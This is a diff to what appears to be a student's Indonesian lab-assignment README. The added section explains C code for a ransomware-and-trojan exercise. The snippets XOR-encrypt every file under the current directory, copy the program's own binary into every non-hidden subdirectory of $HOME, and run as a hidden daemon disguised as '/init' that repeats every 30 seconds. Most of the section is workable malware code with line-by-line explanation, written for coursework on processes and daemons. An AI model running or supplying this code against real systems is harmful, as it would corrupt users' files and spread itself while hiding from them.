@@ -647,6 +647,215 @@ jadi
 
 ## Soal No 3
 
+### 1. Bagian: Enkripsi
+### Fungsi:
+Mengenkripsi semua file reguler di direktori saat ini dan subdirektorinya menggunakan metode XOR dengan 1-byte key. Hasil enkripsi dicatat ke file log.
+
+### Penjelasan Kode:
+#### 1.a **run_wannacryptor()**  
+ ```bash
+ char cwd[PATH_MAX];
+ if (!getcwd(cwd, sizeof(cwd))) return;
+ unsigned char key = (unsigned char)(time(NULL) % 256);
+ encrypt_recursive(cwd, key, cwd);
+ ```
+   - getcwd(cwd, sizeof(cwd)) → Mengambil direktori kerja saat ini.
+   - time(NULL) % 256 → Membuat 1-byte key enkripsi dari waktu saat ini
+   - encrypt_recursive(...) → Memulai proses enkripsi secara rekursif.
+
+#### 1.b **encrypt_recursive()** 
+ ```bash
+ DIR *dir = opendir(dir_path);
+ if (!dir) return;
+
+ while ((entry = readdir(dir)) != NULL) {
+    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
+
+    snprintf(fullpath, PATH_MAX, "%s/%s", dir_path, entry->d_name);
+    if (stat(fullpath, &st) == -1) continue;
+
+    if (S_ISDIR(st.st_mode)) {
+        encrypt_recursive(fullpath, key, cwd);
+    } else if (S_ISREG(st.st_mode)) {
+        xor_encrypt_file(fullpath, key, cwd);
+    }
+ }
+ closedir(dir);
+ ```
+   - readdir → Baca semua isi direktori.
+   - strcmp → Melewatkan entri . dan ...
+   - snprintf → Buat path lengkap ke file/folder.
+   - stat → Ambil info jenis file.
+   - S_ISDIR → Jika direktori → rekursif lagi.
+   - S_ISREG → Jika file biasa → enkripsi.
+
+#### 1.c **xor_encrypt_file()**  
+ ```bash
+ FILE *fp = fopen(filename, "rb+");
+ if (!fp) return;
+
+ fseek(fp, 0, SEEK_END);
+ long size = ftell(fp);
+ rewind(fp);
+
+ unsigned char *buffer = malloc(size);
+ fread(buffer, 1, size, fp);
+ rewind(fp);
+
+ for (long i = 0; i < size; i++) {
+     buffer[i] ^= key;
+ }
+
+ fwrite(buffer, 1, size, fp);
+ fclose(fp);
+ free(buffer);
+
+ write_log(cwd, filename);
+ ```
+   - fopen → Buka file untuk dibaca & ditulis.
+   - fseek & ftell → Cari ukuran file.
+   - malloc(size) → Alokasikan buffer.
+   - fread → Baca isi file ke buffer.
+   - XOR loop → Setiap byte di-XOR dengan key.
+   - fwrite → Tulis hasil enkripsi ke file.
+   - write_log → Catat file yang telah terenkripsi. 
+
+### 2. Bagian: Trojan Spreader
+### Fungsi:
+Menduplikasi file binary runme ke semua subdirektori dalam $HOME, kecuali direktori tersembunyi.
+
+### Penjelasan Kode:
+#### 2.a **spread_trojan()**
+ ```bash
+ char *home = getenv("HOME");
+ if (!home) return;
+
+ char cwd[PATH_MAX];
+ if (!getcwd(cwd, sizeof(cwd))) return;
+
+ char self_path[PATH_MAX];
+ ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
+ if (len == -1) return;
+ self_path[len] = '\0';
+
+ spread_recursive(home, self_path, cwd);
+
+ ```
+   - Ambil path home user.
+   - Ambil path binary file saat ini lewat /proc/self/exe.
+   - Lakukan replikasi lewat spread_recursive.
+
+#### 2.b **spread_recursive()**
+ ```bash
+ DIR *dir = opendir(dir_path);
+ if (!dir) return;
+
+ while ((entry = readdir(dir)) != NULL) {
+    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+        continue;
+    if (entry->d_name[0] == '.') continue;
+
+    snprintf(fullpath, sizeof(fullpath), "%s/%s", dir_path, entry->d_name);
+    if (stat(fullpath, &st) == -1) continue;
+
+    if (S_ISDIR(st.st_mode)) {
+        char runme_path[PATH_MAX];
+        snprintf(runme_path, sizeof(runme_path), "%s/runme", fullpath);
+
+        if (access(runme_path, F_OK) != 0) {
+            copy_file(self_path, runme_path, cwd);
+        }
+
+        spread_recursive(fullpath, self_path, cwd);
+    }
+ }
+ closedir(dir);
+ ```
+   - Skip direktori tersembunyi dan file . / ...
+   - Kalau folder belum ada runme → copy.
+   - Lanjut ke subdirektori secara rekursif.
+
+#### 2.c **copy_file()**
+ ```bash
+ int in = open(src, O_RDONLY);
+ if (in < 0) return;
+
+ int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+ if (out < 0) {
+    close(in);
+    return;
+ }
+
+ char buf[4096];
+ ssize_t n;
+ while ((n = read(in, buf, sizeof(buf))) > 0) {
+    write(out, buf, n);
+ }
+
+ close(in);
+ close(out);
+
+ snprintf(logbuf, sizeof(logbuf), "[COPY] %s -> %s", src, dst);
+ log_trojan(cwd, logbuf);
+ ```
+   - Buka file sumber dan tujuan.
+   - Salin isinya secara blok.
+   - Tulis aktivitas ke trojan_log.txt.
+
+### 3. Bagian: Logging
+### Fungsi:
+Ini sebenarnya tidak ada perintahnya didalam penugasan, tetapi saya buat hanya untuk membantu saya Mencatat aktivitas enkripsi file (log.txt) dan penyebaran trojan (trojan_log.txt) ke file log yang berada satu tingkat di atas direktori kerja saat ini.
+
+### 4. Bagian: Main Daemon
+### Fungsi:
+Menjalankan proses daemon tersembunyi yang secara berkala setiap 30 detik melakukan enkripsi dan penyebaran trojan. Proses ini tidak terlihat oleh user (detach dari terminal).
+
+### Penjelasan Kode:
+#### 4.a **main()**
+ ```bash
+ pid_t pid = fork();
+ if (pid < 0) exit(EXIT_FAILURE);
+ if (pid > 0) exit(EXIT_SUCCESS); // parent keluar
+
+ umask(0);
+ if (setsid() < 0) exit(EXIT_FAILURE);
+
+ char cwd[PATH_MAX];
+ if (!getcwd(cwd, sizeof(cwd))) exit(EXIT_FAILURE);
+ if (chdir(cwd) < 0) exit(EXIT_FAILURE);
+
+ close(STDIN_FILENO);
+ close(STDOUT_FILENO);
+ close(STDERR_FILENO);
+
+ prctl(PR_SET_NAME, "/init", 0, 0, 0);
+ strncpy(argv[0], "/init", MAX_NAME_LENGTH - 1);
+ argv[0][MAX_NAME_LENGTH - 1] = '\0';
+
+ while (1) {
+    pid_t child = fork();
+    if (child == 0) {
+        run_wannacryptor();
+        spread_trojan();
+        exit(EXIT_SUCCESS);
+    }
+    wait(NULL);
+    sleep(30);
+ }
+ ```
+   - fork() pertama → detach dari terminal (jadi daemon).
+   - setsid() → Buat session baru.
+   - prctl() + argv[0] → Nyamar sebagai /init.
+   - Tutup STDIN/STDOUT/STDERR → Supaya sunyi.
+   - Loop setiap 30 detik:
+     - Fork proses anak untuk:
+        - Enkripsi semua file.
+        - Menyebarkan salinan runme.
+
+#### Alasan Tidak Mengerjakan Subsoal E–H (rodok.exe & mine-crafter)
+#### Saya belum mengerjakan bagian E–H karena masih belum cukup paham cara bikin fork bomb dan mengatur prosesnya dengan aman. Selain itu, saya khawatir program ini bisa bikin sistem jadi lambat atau error, apalagi saya nggak pakai VM, jadi cuma pakai laptop pribadi untuk ngetesnya.
+
+
 ## Soal No 4
 
 ### Deskripsi
